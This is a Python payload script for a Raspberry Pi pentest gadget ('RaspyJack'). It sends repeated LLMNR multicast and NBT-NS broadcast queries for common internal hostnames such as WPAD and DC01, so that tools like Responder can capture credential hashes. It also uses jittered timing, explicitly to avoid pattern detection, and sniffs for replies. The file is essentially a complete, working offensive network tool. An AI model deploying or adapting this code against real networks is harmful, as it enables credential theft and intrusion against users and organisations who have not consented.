#!/usr/bin/env python3
"""
RaspyJack Payload -- LLMNR/NBT-NS Query Injector
=================================================
Author: 7h30th3r0n3

Active LLMNR and NBT-NS query injector.  Sends multicast LLMNR queries
(UDP 224.0.0.252:5355) and NBT-NS broadcast queries (UDP port 137) for
non-existent hostnames to trigger hash captures by Responder or similar
tools running on the network.

Controls:
  OK         -- Start / stop injection
  UP / DOWN  -- Scroll hostname list
  KEY1       -- Cycle protocol (LLMNR / NBT-NS / Both)
  KEY3       -- Exit

Requires: scapy
"""

import os
import sys
import time
import struct
import random
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        IP, UDP, Raw, send, sniff as scapy_sniff, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 5
ROW_H = 12

LLMNR_MCAST = "224.0.0.252"
LLMNR_PORT = 5355
NBTNS_BCAST = "255.255.255.255"
NBTNS_PORT = 137

HOSTNAMES = [
    "WPAD", "ISATAP", "FILESRV", "PRINTER", "DC01", "EXCHANGE",
    "SHAREPOINT", "SQLSERVER", "MAILSRV", "INTRANET", "BACKUP",
    "FILESERVER", "WEBPROXY", "HELPDESK", "NETLOGON", "CITRIX",
    "VPNGATE", "NAS01", "SCCM", "WSUS",
]

PROTOCOLS = ["LLMNR", "NBT-NS", "Both"]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
injecting = False
protocol_idx = 0
queries_sent = 0
responses_detected = 0
scroll = 0
status_msg = "Ready"

# ---------------------------------------------------------------------------
# Packet builders
# ---------------------------------------------------------------------------

def _build_llmnr_query(hostname):
    """Build an LLMNR query packet for a hostname."""
    txn_id = random.randint(0, 0xFFFF)
    encoded = b""
    for part in hostname.split("."):
        encoded += bytes([len(part)]) + part.encode("ascii")
    encoded += b"\x00"
    # DNS-style query: header + question
    header = struct.pack("!HHHHHH", txn_id, 0x0000, 1, 0, 0, 0)
    question = encoded + struct.pack("!HH", 1, 1)  # A record, IN class
    payload = header + question
    pkt = (
        IP(dst=LLMNR_MCAST, ttl=1)
        / UDP(sport=random.randint(49152, 65535), dport=LLMNR_PORT)
        / Raw(load=payload)
    )
    return pkt


def _encode_nbtns_name(name):
    """Encode a NetBIOS name using first-level encoding (RFC 1001)."""
    padded = name.upper().ljust(16, " ")[:16]
    encoded = b""
    for ch in padded.encode("ascii"):
        encoded += bytes([0x41 + (ch >> 4), 0x41 + (ch & 0x0F)])
    return encoded


def _build_nbtns_query(hostname):
    """Build an NBT-NS name query broadcast packet."""
    txn_id = random.randint(0, 0xFFFF)
    flags = 0x0110  # recursion desired, broadcast
    header = struct.pack("!HHHHHH", txn_id, flags, 1, 0, 0, 0)
    nb_name = _encode_nbtns_name(hostname)
    # Length-prefixed name + null terminator
    question = bytes([32]) + nb_name + b"\x00"
    question += struct.pack("!HH", 0x0020, 0x0001)  # NB type, IN class
    payload = header + question
    pkt = (
        IP(dst=NBTNS_BCAST)
        / UDP(sport=137, dport=NBTNS_PORT)
        / Raw(load=payload)
    )
    return pkt

# ---------------------------------------------------------------------------
# Injection thread
# ---------------------------------------------------------------------------

def _inject_thread():
    """Send queries in a loop until stopped."""
    global injecting, queries_sent, status_msg

    hostname_idx = 0

    while _running and injecting:
        hostname = HOSTNAMES[hostname_idx % len(HOSTNAMES)]
        proto = PROTOCOLS[protocol_idx]

        try:
            if proto in ("LLMNR", "Both"):
                pkt = _build_llmnr_query(hostname)
                send(pkt, verbose=False)
                with lock:
                    queries_sent += 1

            if proto in ("NBT-NS", "Both"):
                pkt = _build_nbtns_query(hostname)
                send(pkt, verbose=False)
                with lock:
                    queries_sent += 1

            with lock:
                status_msg = f"Sent: {hostname} ({proto})"
        except Exception as exc:
            with lock:
                status_msg = f"Err: {str(exc)[:16]}"

        hostname_idx += 1
        # Jittered delay to avoid pattern detection
        delay = random.uniform(0.5, 2.0)
        deadline = time.time() + delay
        while time.time() < deadline and _running and injecting:
            time.sleep(0.1)

    with lock:
        injecting = False
        status_msg = "Stopped"

# ---------------------------------------------------------------------------
# Response sniffer thread
# ---------------------------------------------------------------------------

def _sniffer_thread():
    """Sniff for LLMNR and NBT-NS responses."""
    global responses_detected

    def _handle(pkt):
        if not _running:
            return
        if pkt.haslayer(UDP):
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport
            # LLMNR response (src port 5355) or NBT-NS response (src port 137)
            if sport in (LLMNR_PORT, NBTNS_PORT) and dport not in (LLMNR_PORT, NBTNS_PORT):
                with lock:
                    responses_detected += 1

    try:
        scapy_sniff(
            prn=_handle,
            store=False,
            filter="udp port 5355 or udp port 137",
            stop_filter=lambda _: not _running,
        )
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font_obj):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "LLMNR/NBT INJECT", font=font_obj, fill="#FF6600")
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if injecting else "#444")

    with lock:
        proto = PROTOCOLS[protocol_idx]
        sent = queries_sent
        resps = responses_detected
        msg = status_msg

    d.text((2, 16), f"Proto: {proto}", font=font_obj, fill="#FFAA00")
    d.text((2, 28), f"Queries: {sent}", font=font_obj, fill="#AAAAAA")
    d.text((2, 38), f"Responses: {resps}", font=font_obj, fill="#00FF88")
    d.text((2, 48), msg[:24], font=font_obj, fill="#888")

    # Hostname list
    d.text((2, 62), "Hostnames:", font=font_obj, fill="#666")
    visible = HOSTNAMES[scroll:scroll + ROWS_VISIBLE]
    for i, name in enumerate(visible):
        y = 74 + i * ROW_H
        marker = ">" if (scroll + i) == (scroll) else " "
        d.text((2, y), f"{marker}{name}", font=font_obj, fill="#CCCCCC")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if injecting:
        d.text((2, 117), "OK:Stop  K3:Exit", font=font_obj, fill="#888")
    else:
        d.text((2, 117), "OK:Go K1:Proto K3:Quit", font=font_obj, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, injecting, protocol_idx, scroll

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font_obj, fill="#FF0000")
        d.text((4, 65), "pip install scapy", font=font_obj, fill="#888")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    # Start background sniffer
    threading.Thread(target=_sniffer_thread, daemon=True).start()

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "OK":
                if injecting:
                    injecting = False
                else:
                    injecting = True
                    threading.Thread(
                        target=_inject_thread, daemon=True
                    ).start()
                time.sleep(0.3)

            elif btn == "KEY1" and not injecting:
                protocol_idx = (protocol_idx + 1) % len(PROTOCOLS)
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                max_scroll = max(0, len(HOSTNAMES) - ROWS_VISIBLE)
                scroll = min(scroll + 1, max_scroll)
                time.sleep(0.15)

            _draw_frame(lcd, font_obj)
            time.sleep(0.05)

    finally:
        _running = False
        injecting = False
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
